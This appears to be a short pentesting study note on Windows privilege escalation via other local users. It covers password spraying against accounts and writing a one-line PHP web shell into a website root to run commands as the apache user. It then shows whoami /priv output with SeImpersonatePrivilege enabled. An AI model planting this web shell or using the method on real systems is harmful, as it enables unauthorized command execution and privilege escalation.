# Other Users

So just like linux, whenever we see other users, we try to spam passwords and see if we can get access to other users who could possibly have more privilege.&#x20;

So lets say in Windows we enumerate the users and we see that there is an apache user. In that same computer there is also a website running. So, chances are if we are able to overwrite files in the location of the website, we will be executing code as the user apache.&#x20;

{% embed url="https://app.gitbook.com/s/hNEcBmjpao37mR29JPHE/priv-escalation" %}

Lets take this case for example, we wrote a php file that did the following.&#x20;

```
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
```

It allows us to execute commands. As our current user we were able to write this file into the root directory of the website and be able to run it.&#x20;

![](<../../../.gitbook/assets/image (55).png>)

Then it turned out that the user apache had impersonation privileges.&#x20;

```
C:\Users\apache>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
